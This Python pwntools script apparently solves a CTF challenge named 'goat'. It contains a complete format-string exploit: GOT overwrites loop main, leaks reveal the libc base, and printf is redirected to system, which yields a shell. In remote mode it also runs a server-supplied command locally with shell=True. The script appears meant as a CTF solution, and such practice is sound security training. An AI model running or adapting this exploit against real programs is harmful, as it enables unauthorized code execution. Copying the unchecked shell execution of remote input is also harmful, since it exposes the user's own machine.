#!/usr/bin/env python3
# Local Ubuntu 24.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./goat"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "goat.chal.cyberjousting.com"
  PORT = 1349
  s = remote(HOST, PORT)
  s.recvuntil(b"work:\n")
  r = s.recvuntil(b"\n")
  print(r)
  s0 = process(r, shell=True)
  r0 = s0.recvuntil(b"\n")
  s.sendafter(b"solution: ", r0)
else:
  s = process(BINARY)
libc = elf.libc

# loop main()
buf  = b"%%%dc%%10$hn" % ((elf.sym.main & 0xFFFF) - 0x18)
buf  = buf.ljust(16, b"\x00")
buf += p64(elf.got.puts)
s.sendlineafter(b"name? ", buf)
s.sendline(b"")

# libc leak
buf  = b"%30$p,%10$s"
buf  = buf.ljust(16, b"\x00")
buf += p64(elf.got.fgets)
s.sendlineafter(b"name? ", buf)
s.recvuntil(b"said:\n")
stack_leak = int(s.recvuntil(b",")[:-1], 16)
print("stack_leak =", hex(stack_leak))
fgets_addr = u64(s.recvn(6) + b"\x00"*2)
libc_base  = fgets_addr - libc.sym.fgets
print("fgets_addr =", hex(fgets_addr))
print("libc_base  =", hex(libc_base))

s.sendline(b"")

system_addr = libc_base + libc.sym.system
buf  = b"%%%dc%%10$hn" % ((system_addr & 0xFFFF) - 0x18)
buf  = buf.ljust(16, b"\x00")
buf += p64(elf.got.printf)
s.sendlineafter(b"name? ", buf)
s.sendline(b"")

s.interactive() 
